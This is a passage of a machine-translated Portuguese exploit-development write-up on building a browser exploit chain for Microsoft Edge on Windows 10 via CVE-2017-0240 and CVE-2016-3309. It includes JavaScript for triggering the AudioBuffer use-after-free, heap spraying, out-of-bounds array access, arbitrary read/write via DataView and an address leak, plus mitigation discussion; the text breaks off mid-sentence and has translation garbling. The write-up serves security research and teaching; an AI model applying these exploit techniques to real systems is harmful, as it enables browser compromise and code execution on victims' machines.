<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßëüèΩ‚Äçü§ù‚ÄçüßëüèΩ üßÄ üîè Microsoft Edge do CVE ao RCE no Windows 10 üíê üåâ ‚ôÄÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Na estrutura deste artigo, consideraremos com detalhes suficientes o processo de cria√ß√£o de uma explora√ß√£o para uma vulnerabilidade no Microsoft Edge,...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge do CVE ao RCE no Windows 10</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Introdu√ß√£o"></p><br><p>  Na estrutura deste artigo, consideraremos com detalhes suficientes o processo de cria√ß√£o de uma explora√ß√£o para uma vulnerabilidade no Microsoft Edge, com a sa√≠da subsequente da sandbox.  Se voc√™ estiver interessado em saber como √© esse processo, seja bem-vindo em cat! </p><a name="habracut"></a><br><h2 id="vvedenie">  1. Introdu√ß√£o </h2><br><p> No mais recente <code>Pwn2Own 2019</code> em Montreal, na categoria navegadores, foi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">demonstrada</a> uma explora√ß√£o por hackers no <code>Microsoft Edge</code> .  Duas vulnerabilidades foram usadas para isso: <code>double free</code> no renderizador e uma vulnerabilidade l√≥gica para sair da caixa de prote√ß√£o.  Essas duas vulnerabilidades foram recentemente fechadas e atribu√≠das ao <code>CVE</code> correspondente: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><code>CVE-2019-0940</code></a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><code>CVE-2019-0938</code></a> .  Voc√™ pode ler mais sobre vulnerabilidades no blog: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Pwn2Own 2019: Explora√ß√£o do Microsoft Edge Renderer (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 1</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Parte 2</a> </p><br><p>  Como parte de nosso artigo, queremos mostrar o processo de grava√ß√£o dessa explora√ß√£o e quanto tempo e recursos s√£o necess√°rios para isso usando o exemplo do <code>Microsoft Edge</code> no <code>Windows 10</code> usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><code>CVE-2017-0240</code></a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><code>CVE-2016-3309</code></a> .  Uma das diferen√ßas ser√° que, se a explora√ß√£o demonstrada no <code>Pwn2Own</code> usou uma vulnerabilidade l√≥gica para sair da caixa de prote√ß√£o, em nosso cen√°rio, a vulnerabilidade no kernel do <code>Windows 10</code> ser√° usada para sair da caixa de prote√ß√£o.  Como os patches da <code>Microsoft</code> mostram, h√° muito mais vulnerabilidades no kernel do que vulnerabilidades na implementa√ß√£o da sandbox.  Como resultado, √© muito mais prov√°vel que essa cadeia de vulnerabilidades seja encontrada e ser√° √∫til saber para os funcion√°rios de SI nas empresas. </p><br><h2 id="ishodnye-dannye">  Dados de origem </h2><br><p>  Este artigo abordar√° o processo de cria√ß√£o de uma explora√ß√£o de 1 dia para o navegador <code>Microsoft Edge</code> .  <code>CVE-2017-0240</code> ser√° operado.  O primeiro est√°gio da opera√ß√£o ser√° realizado com base nos materiais da fonte [1], obteremos um <code>arbitrary address read/write</code> primitivo e tamb√©m nos familiarizaremos com v√°rias t√©cnicas que podem ser √∫teis ao explorar essas vulnerabilidades.  A seguir, apresentaremos a ferramenta <code>pwn.js</code> , que o ajudar√° a obter uma chamada para fun√ß√µes arbitr√°rias com base na leitura e grava√ß√£o arbitr√°rias, e tamb√©m considerar√° v√°rias <code>mitigations</code> e maneiras de contorn√°-las.  No √∫ltimo est√°gio, a vulnerabilidade do kernel do Windows <code>CVE-2016-3309</code> ser√° explorada para aumentar privil√©gios, contornar <code>AppContainer</code> restri√ß√µes do <code>AppContainer</code> e obter controle completo sobre a m√°quina atacada. </p><br><p>  A opera√ß√£o ser√° realizada no estande com o <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> e o navegador <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  Etapa 1. Obtendo uma <code>arbitrary address read/write</code> Arbitr√°rio </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Descri√ß√£o da vulnerabilidade e obten√ß√£o de <code>OOB</code> </h3><br><p>  Uma vulnerabilidade do tipo <code>use-after-free</code> presente no m√©todo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">copyFromChannel</a> do objeto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Audio Buffer</a> . </p><br><blockquote>  AudioBuffer √© a interface de um ativo de √°udio curto localizado na mem√≥ria e criado a partir de um arquivo de √°udio usando o m√©todo AudioContext.decodeAudioData () ou dos dados de origem usando o m√©todo AudioContext.createBuffer ().  Os dados de √°udio colocados no AudioBuffer podem ser reproduzidos no AudioBufferSourceNode. </blockquote><p>  A apresenta√ß√£o de <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> fornece uma an√°lise detalhada da vulnerabilidade e do patch.  Quando o m√©todo <code>copyFromChannel</code> √© <code>copyFromChannel</code> , o conte√∫do do canal do buffer de √°udio √© copiado para o buffer de <code>destination</code> especificado pelo primeiro argumento.  O m√©todo tamb√©m aceita o n√∫mero do canal ( <code>channelNumber</code> ) e o deslocamento no buffer de √°udio ( <code>startInChannel</code> ), come√ßando pelo qual a c√≥pia √© necess√°ria.  Antes de copiar diretamente os dados para o <code>destination</code> na fun√ß√£o <code>CDOMAudioBuffer::Var_copyFromChannel</code> , o buffer de <code>destination</code> √© armazenado em cache (o endere√ßo e o tamanho do buffer s√£o armazenados em vari√°veis ‚Äã‚Äãde fun√ß√µes locais na pilha) e os valores dos objetos <code>startInChannel</code> e <code>startInChannel</code> s√£o <code>startInChannel</code> no tipo <code>Int</code> , para o qual o m√©todo <code>valueOf</code> dos objetos convertidos √© chamado.  A vulnerabilidade √© que um buffer em cache pode ser liberado no momento da convers√£o de tipo no m√©todo substitu√≠do do objeto <code>valueOf</code> .  Para verifica√ß√£o, usamos o seguinte c√≥digo: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  Esse c√≥digo usa a tecnologia <code>Web Workers</code> para liberar o buffer.  Depois de criar um <code>Worker</code> vazio, podemos enviar uma mensagem para ele usando o m√©todo <code>postMessage</code> .  O segundo argumento de <code>transfer</code> opcional desse m√©todo <code>ArrayBuffer</code> uma matriz de objetos <code>Transferable</code> ( <code>ArrayBuffer</code> , <code>MessagePost</code> ou <code>ImageBitmap</code> ), os direitos do objeto ser√£o transferidos para <code>Worker</code> e o objeto n√£o estar√° mais dispon√≠vel no contexto atual, para que possa ser exclu√≠do.  Depois disso, ocorre uma chamada para <code>sleep</code> - uma fun√ß√£o que interrompe temporariamente a execu√ß√£o de um programa (√© implementado de forma independente).  Isso √© necess√°rio para que o sistema de coleta de lixo ( <code>GC</code> , <code>Garbage Collector</code> ) consiga liberar o buffer, cujos direitos foram transferidos. </p><br><blockquote>  Os Web Workers fornecem um meio simples de executar scripts no encadeamento em segundo plano.  O encadeamento de trabalho pode executar tarefas sem interferir na interface do usu√°rio.  Al√©m disso, eles podem fazer E / S usando XMLHttpRequest (embora os atributos responseXML e channel sempre sejam nulos).  Um trabalhador existente pode enviar mensagens JavaScript para o c√≥digo do criador atrav√©s do manipulador de eventos especificado por este c√≥digo (e vice-versa). </blockquote><p>  Ao executar esse c√≥digo no Edge no depurador, voc√™ pode obter a seguinte falha. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Falha na etapa 01"></p><br><p>  Como resultado, a chamada para <code>copyFromChannel</code> tenta copiar o conte√∫do do buffer de √°udio na √°rea de mem√≥ria n√£o alocada.  Para explorar a vulnerabilidade, √© necess√°rio conseguir a aloca√ß√£o de qualquer objeto nesta √°rea de mem√≥ria.  Nesse caso, o segmento da matriz √© perfeito. </p><br><p>  As matrizes no <code>Chakra</code> (o mecanismo <code>JS</code> usado no navegador <code>Edge</code> ) s√£o organizadas da seguinte forma: o objeto da matriz tem um tamanho fixo, os ponteiros para os objetos da matriz (ou valores, no caso do <code>IntArray</code> ) s√£o armazenados em uma √°rea de mem√≥ria separada - o segmento, o ponteiro no qual o objeto est√° contido array.  O cabe√ßalho do segmento cont√©m v√°rias informa√ß√µes, incluindo o tamanho do segmento, que corresponde ao tamanho da matriz.  O tamanho da matriz tamb√©m est√° presente no pr√≥prio objeto da matriz.  Esquematicamente, fica assim: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Estrutura de matriz"></p><br><p>  Portanto, se conseguirmos selecionar o segmento da matriz no espa√ßo liberado anteriormente, podemos substituir o cabe√ßalho do segmento da matriz pelo conte√∫do do buffer de √°udio.  Para fazer isso, modificamos o c√≥digo acima adicionando as seguintes linhas ap√≥s <code>sleep(1000);</code>  : </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  O tamanho das matrizes √© selecionado de forma que o tamanho do segmento da matriz ocupe um segmento inteiro de heap (a parte m√≠nima indivis√≠vel da mem√≥ria heap, cujo tamanho √© 0x10000 bytes).  Execute esse c√≥digo, especificando a fun√ß√£o <code>memcpy</code> como um ponto de interrup√ß√£o (haver√° muitas chamadas <code>memcpy</code> , portanto, faz sentido parar primeiro no <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ), no qual ocorreu a falha.  Temos o seguinte resultado: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="Etapa 02"></p><br><p>  √ìtimo!  Agora podemos sobrescrever o cabe√ßalho do segmento da matriz com nossos pr√≥prios valores.  Os valores mais interessantes nesse caso s√£o o tamanho da matriz, cujo deslocamento podemos ver na captura de tela acima.  Altere o conte√∫do do buffer de √°udio da seguinte maneira: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  Preste aten√ß√£o aos valores de <code>ta2[14]</code> e <code>ta2[15]</code> - eles j√° se referem n√£o ao cabe√ßalho do segmento, mas aos pr√≥prios valores da matriz.  Com isso, podemos determinar a matriz que precisamos na matriz global <code>arr</code> , da seguinte maneira: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  Se, como resultado, uma matriz foi encontrada, os dois primeiros elementos foram alterados de uma certa maneira, tudo est√° bem.  Agora temos uma matriz cujo tamanho do segmento √© maior do que realmente √©.  As matrizes restantes podem ser liberadas. </p><br><p>  Aqui √© necess√°rio lembrar que o tamanho da matriz existe em duas entidades: no objeto da matriz, onde permaneceu inalterado, e no segmento da matriz, onde o aumentamos.  Acontece que o tamanho no objeto da matriz √© ignorado se o c√≥digo for executado no modo <code>JIT</code> e tiver sido otimizado.  Isso √© facilmente alcan√ßado, por exemplo, da seguinte maneira: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  Depois disso, usando as <code>arr_set</code> e <code>arr_set</code> voc√™ pode ir al√©m dos limites da matriz ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Usando <code>OOB</code> para obter a primitiva de leitura e grava√ß√£o em um endere√ßo arbitr√°rio </h3><br><p>  Nesta se√ß√£o, consideramos uma t√©cnica que permite ler e gravar em um endere√ßo arbitr√°rio usando <code>OOB</code> .  O m√©todo pelo qual obtemos isso ser√° semelhante ao usado na fonte [1], mas tamb√©m haver√° mudan√ßas significativas. </p><br><p>  Na vers√£o usada do <code>Edge</code> os blocos de mem√≥ria para o heap s√£o alocados sequencialmente, devido aos quais, ao alocar um grande n√∫mero de objetos, mais cedo ou mais tarde eles estar√£o ap√≥s o segmento da matriz, al√©m do qual podemos ir. </p><br><p>  Primeiro, ele nos permite ler um ponteiro para uma tabela virtual de m√©todos de objetos ( <code>vftable</code> ), para que possamos ignorar a randomiza√ß√£o do espa√ßo de endere√ßo do processo ( <code>ASLR</code> ).  Mas o acesso a quais objetos nos ajudar√° a obter leitura e escrita arbitr√°rias?  Alguns objetos <code>DataView</code> s√£o √≥timos para isso. </p><br><blockquote>  O DataView fornece uma interface de baixo n√≠vel para leitura e grava√ß√£o de v√°rios tipos num√©ricos em um ArrayBuffer bin√°rio, independentemente da ordem dos bytes da plataforma. </blockquote><p>  A estrutura interna do <code>DataView</code> cont√©m um ponteiro para um buffer.  Para ler e gravar em um endere√ßo arbitr√°rio, por exemplo, podemos construir uma cadeia de dois <code>DataView</code> ( <code>dv1</code> e <code>dv2</code> ) da seguinte maneira: como buffer <code>dv1</code> especifique o endere√ßo <code>dv2</code> acessando a matriz.  Agora, usando <code>dv1</code> , podemos alterar o endere√ßo do buffer <code>dv2</code> , devido ao qual leitura e grava√ß√£o arbitr√°rias s√£o obtidas.  Esquematicamente, isso pode ser representado da seguinte maneira: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Leitura / grava√ß√£o de endere√ßo arbitr√°rio"></p><br><p>  Para usar esse m√©todo, voc√™ precisa aprender como determinar os endere√ßos dos objetos na mem√≥ria.  Para fazer isso, existe a seguinte t√©cnica: voc√™ precisa criar uma nova <code>Array</code> , use <code>OOB</code> para salvar sua <code>vftable</code> e <code>typeId</code> (os dois primeiros campos de 64 bits da estrutura) e atribuir o objeto ao qual o endere√ßo √© de interesse para o primeiro elemento da matriz.  Em seguida, voc√™ deve restaurar os <code>typeId</code> e <code>vftable</code> salvos anteriormente.  Agora, a palavra dupla j√∫nior e s√™nior do endere√ßo do objeto pode ser obtida consultando o primeiro e o segundo elemento da matriz.  O fato √© que, por padr√£o, a nova matriz √© <code>IntArray</code> e os valores de 4 bytes da matriz s√£o armazenados em seu segmento como est√£o.  Ao atribuir um objeto a uma matriz, a matriz √© convertida em um <code>ObjectArray</code> e seu segmento √© usado para armazenar os endere√ßos dos objetos.  A convers√£o muda <code>vftable</code> e <code>typeId</code> .  Portanto, se restaurarmos os valores originais <code>vftable</code> e <code>typeId</code> , atrav√©s dos elementos dessa matriz, podemos acessar o segmento diretamente.  O processo esquematicamente descrito pode ser representado da seguinte maneira: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Vazamento de ponteiro"></p><br><p>  A fun√ß√£o para obter o endere√ßo ter√° a seguinte apar√™ncia: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  Uma quest√£o em aberto continua sendo a cria√ß√£o dos objetos necess√°rios e sua pesquisa usando <code>OOB</code> .  Como mencionado anteriormente, ao alocar um grande n√∫mero de objetos, mais cedo ou mais tarde eles come√ßar√£o a se destacar ap√≥s o segmento da matriz, al√©m do qual podemos ir.  Para encontrar os objetos necess√°rios, basta percorrer os √≠ndices fora da matriz em busca dos objetos necess√°rios.  Porque  todos os objetos do mesmo tipo est√£o localizados em um segmento do heap, voc√™ pode otimizar a pesquisa e percorrer os segmentos do heap em incrementos de <code>0x10000</code> e verificar apenas os primeiros valores desde o in√≠cio de cada segmento do heap.  Para identificar objetos, voc√™ pode definir valores exclusivos para alguns par√¢metros (por exemplo, para <code>DataView</code> pode ser <code>byteOffset</code> ) ou, usando as constantes j√° conhecidas na estrutura do objeto (por exemplo, na vers√£o usada do <code>Edge</code> no <code>IntArray</code> , o valor <code>0x10005</code> sempre √© encontrado em <code>0x18</code> ). </p><br><p>  Ao combinar todas as t√©cnicas acima, voc√™ pode ler e gravar em um endere√ßo arbitr√°rio.  Abaixo est√° uma captura de tela da leitura de objetos de mem√≥ria <code>DataView</code> . </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="Vazamento de mem√≥ria"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  Etapa 2. Executando fun√ß√µes arbitr√°rias da API </h2><br><p>  Nesse est√°gio, pudemos ler e gravar em um endere√ßo arbitr√°rio dentro do processo de exibi√ß√£o de conte√∫do do <code>Edge</code> .  Considere as principais tecnologias que devem interferir com a opera√ß√£o adicional do aplicativo e suas solu√ß√µes alternativas.  J√° escrevemos uma pequena s√©rie de artigos <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">parte 1, introdut√≥ria</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">parte 2, Internet Explorer e Edge</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">parte 3, Google Chrome</a> ), mas lembre-se de que os desenvolvedores n√£o param e adicionam novas ferramentas aos seus produtos prote√ß√£o. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Randomiza√ß√£o do espa√ßo de endere√ßo ( <code>ASLR</code> ) </h3><br><blockquote>  O ASLR (randomiza√ß√£o de layout de espa√ßo de endere√ßo em ingl√™s) √© uma tecnologia usada em sistemas operacionais que altera aleatoriamente o local de estruturas de dados importantes no espa√ßo de endere√ßo do processo, a saber: imagens de arquivos execut√°veis, bibliotecas carregadas, pilhas e empilhar. </blockquote><p>  Acima, aprendemos a ler os endere√ßos das tabelas de classes virtuais, usando-os; podemos calcular facilmente o endere√ßo base do m√≥dulo <code>Chakra.dll</code> , para que o <code>ASLR</code> n√£o apresente problemas para opera√ß√µes posteriores. </p><br><h3 id="data-execution-protection-dep-nx">  Prote√ß√£o de execu√ß√£o de dados ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  O Data Execution Prevention (DEP) √© um recurso de seguran√ßa incorporado ao Linux, Mac OS X, Android e Windows que impede que um aplicativo execute c√≥digo de uma √°rea de mem√≥ria marcada como "somente dados".  Isso impedir√° alguns ataques, que, por exemplo, salvam o c√≥digo em uma √°rea usando estouros de buffer. </blockquote><p>  Uma maneira de contornar essa prote√ß√£o √© chamar o <code>VirtualAlloc</code> usando cadeias <code>ROP</code> .  Mas no caso do <code>Edge</code> esse m√©todo n√£o funcionar√° devido ao <code>ACG</code> (veja abaixo). </p><br><h3 id="control-flow-guard-cfg">  Protetor de fluxo de controle ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> √© um mecanismo de prote√ß√£o que visa complicar o processo de explora√ß√£o de vulnerabilidades bin√°rias em aplicativos de modo de usu√°rio e kernel.  O trabalho desse mecanismo consiste em validar chamadas indiretas, o que impede um invasor de interceptar o encadeamento de execu√ß√£o (por exemplo, substituindo a tabela de fun√ß√µes virtuais) </blockquote><p>  Essa tecnologia controla apenas chamadas indiretas, por exemplo, chamadas de m√©todo da tabela virtual de fun√ß√µes de objeto.  Os endere√ßos de retorno na pilha n√£o s√£o controlados e isso pode ser usado para criar cadeias <code>ROP</code> .  O uso futuro de cadeias <code>ROP/JOP/COP</code> pode ser dificultado pela nova tecnologia <code>Intel</code> : <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  Essa tecnologia consiste em duas partes: </p><br><ol><li>  <code>Shadow Stack</code> sombras (shadow shadow) - usada para controlar endere√ßos de retorno e protege contra cadeias de <code>ROP</code> ; </li><li>  <code>Indirect Branch Tracking</code> √© um m√©todo de prote√ß√£o contra cadeias <code>JOP/COP</code> .  √â uma nova instru√ß√£o <code>ENDBRANCH</code> que marca todos os endere√ßos de transi√ß√£o v√°lidos para instru√ß√µes de <code>call</code> e <code>jmp</code> . </li></ol><br><h3 id="arbitrary-code-guard-acg">  Guarda de C√≥digo Arbitr√°rio ( <code>ACG</code> ) </h3><br><blockquote>  <code>ACG</code> √© uma tecnologia que impede a gera√ß√£o din√¢mica de c√≥digo (√© proibido alocar √°reas de mem√≥ria <code>VirtaulAlloc</code> usando <code>VirtaulAlloc</code> ) e suas modifica√ß√µes (√© imposs√≠vel <code>VirtaulAlloc</code> √°rea de mem√≥ria existente como execut√°vel) </blockquote><p>  Essa prote√ß√£o, como o 